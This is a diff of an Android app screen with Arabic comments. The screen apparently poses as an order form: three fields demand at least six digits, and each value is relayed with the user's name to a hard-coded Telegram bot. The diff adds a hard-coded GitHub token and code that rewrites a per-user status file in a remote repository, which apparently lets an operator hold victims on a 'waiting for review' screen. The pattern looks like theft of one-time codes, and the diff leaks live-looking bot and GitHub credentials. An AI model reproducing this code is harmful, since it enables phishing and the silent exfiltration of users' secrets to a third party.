@@ -4,6 +4,7 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
+import android.util.Base64;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -16,6 +17,7 @@ import java.io.IOException;
 import okhttp3.Call;
 import okhttp3.Callback;
 import okhttp3.FormBody;
+import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
@@ -32,10 +34,11 @@ public class SecondActivity extends AppCompatActivity {
     private final Handler handler = new Handler();
     private Runnable refreshRunnable;
 
-    // --- إعدادات الربط (استخدم بياناتك هنا) ---
+    // --- إعدادات الربط ---
     private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/";
     private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
     private final String CHAT_ID = "1749638488";
+    private final String GITHUB_TOKEN = "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"; // مطلوب لتحديث الحالة تلقائياً
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -64,39 +67,20 @@ public class SecondActivity extends AppCompatActivity {
         btnConfirm2 = findViewById(R.id.btnConfirm2);
         btnConfirm3 = findViewById(R.id.btnConfirm3);
         btnFinalOrder = findViewById(R.id.btnFinalOrder);
-        btnCancelOrder = findViewById(R.id.btnCancelOrder); // الزر الجديد
+        btnCancelOrder = findViewById(R.id.btnCancelOrder);
     }
 
     private void setupButtons() {
-        // أزرار تأكيد الحقول
         btnConfirm1.setOnClickListener(v -> sendToTg("الحقل الأول", field1.getText().toString()));
         btnConfirm2.setOnClickListener(v -> sendToTg("الحقل الثاني", field2.getText().toString()));
         btnConfirm3.setOnClickListener(v -> sendToTg("الحقل الثالث", field3.getText().toString()));
 
-        // زر إكمال الطلب النهائي
         btnFinalOrder.setOnClickListener(v -> {
-            Toast.makeText(this, "شكراً لك، تم إرسال الطلب النهائي بنجاح.", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "تم إرسال الطلب النهائي بنجاح", Toast.LENGTH_LONG).show();
+            updateGithubStatus("waiting"); // يعود للانتظار بعد الطلب النهائي أيضاً
         });
 
-        // زر إلغاء الطلب والعودة للرئيسية
         btnCancelOrder.setOnClickListener(v -> cancelOrder());
-    }
-
-    private void cancelOrder() {
-        // 1. إرسال تنبيه الإلغاء لتليجرام
-        String cancelMsg = "⚠️ إشعار: قام المستخدم بإلغاء طلبه.\n👤 الاسم: " + userName;
-        sendNotificationOnly(cancelMsg);
-
-        // 2. مسح الذاكرة المحلية (البيانات والحالة)
-        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
-        pref.edit().clear().apply();
-
-        // 3. العودة للرئيسية وإغلاق الصفحة الحالية
-        runOnUiThread(() -> {
-            Toast.makeText(this, "تم إلغاء الطلب ومسح البيانات", Toast.LENGTH_SHORT).show();
-            startActivity(new Intent(SecondActivity.this, MainActivity.class));
-            finish();
-        });
     }
 
     private void startAutoRefresh() {
@@ -143,12 +127,75 @@ public class SecondActivity extends AppCompatActivity {
 
     private void sendToTg(String label, String value) {
         if (value.length() < 6) {
-            Toast.makeText(this, "يرجى إدخال البيانات بشكل صحيح", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "يرجى إدخال 6 أرقام على الأقل", Toast.LENGTH_SHORT).show();
             return;
         }
         String msg = "📩 تحديث من " + userName + ":\n" + label + " ⬅️ " + value;
         sendNotificationOnly(msg);
-        Toast.makeText(this, "تم إرسال " + label, Toast.LENGTH_SHORT).show();
+        
+        // تحويل الحالة في GitHub إلى waiting فور الإرسال
+        updateGithubStatus("waiting");
+        
+        runOnUiThread(() -> {
+            Toast.makeText(this, "تم الإرسال، يرجى الانتظار للمراجعة", Toast.LENGTH_SHORT).show();
+            layoutFields.setVisibility(View.GONE);
+            layoutWaiting.setVisibility(View.VISIBLE);
+        });
+    }
+
+    private void cancelOrder() {
+        String cancelMsg = "⚠️ إشعار: قام المستخدم بإلغاء طلبه.\n👤 الاسم: " + userName;
+        sendNotificationOnly(cancelMsg);
+
+        // مسح الحالة من GitHub لضمان عدم القراءة الخاطئة لاحقاً
+        updateGithubStatus("cancelled");
+
+        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
+        pref.edit().clear().apply();
+
+        runOnUiThread(() -> {
+            Toast.makeText(this, "تم إلغاء الطلب بنجاح", Toast.LENGTH_SHORT).show();
+            startActivity(new Intent(SecondActivity.this, MainActivity.class));
+            finish();
+        });
+    }
+
+    private void updateGithubStatus(String newStatus) {
+        String url = "https://api.github.com/repos/abdullah14120/ban/contents/commands/" + userName + ".json";
+        
+        // خطوة 1: جلب SHA لتصريح التعديل
+        Request getRequest = new Request.Builder()
+                .url(url)
+                .header("Authorization", "Bearer " + GITHUB_TOKEN)
+                .get().build();
+
+        client.newCall(getRequest).enqueue(new Callback() {
+            @Override public void onFailure(Call call, IOException e) {}
+            @Override public void onResponse(Call call, Response response) throws IOException {
+                if (response.isSuccessful()) {
+                    try {
+                        JSONObject getJson = new JSONObject(response.body().string());
+                        String sha = getJson.getString("sha");
+
+                        // خطوة 2: تحديث المحتوى بـ SHA الجديد
+                        String newContent = "{\"status\": \"" + newStatus + "\"}";
+                        String encodedContent = Base64.encodeToString(newContent.getBytes(), Base64.NO_WRAP);
+                        String payload = "{\"message\":\"update_status\",\"content\":\"" + encodedContent + "\",\"sha\":\"" + sha + "\"}";
+
+                        RequestBody body = RequestBody.create(payload, MediaType.parse("application/json"));
+                        Request putRequest = new Request.Builder()
+                                .url(url)
+                                .header("Authorization", "Bearer " + GITHUB_TOKEN)
+                                .put(body).build();
+
+                        client.newCall(putRequest).enqueue(new Callback() {
+                            @Override public void onFailure(Call call, IOException e) {}
+                            @Override public void onResponse(Call call, Response response) {}
+                        });
+                    } catch (Exception ignored) {}
+                }
+            }
+        });
     }
 
     private void sendNotificationOnly(String text) {
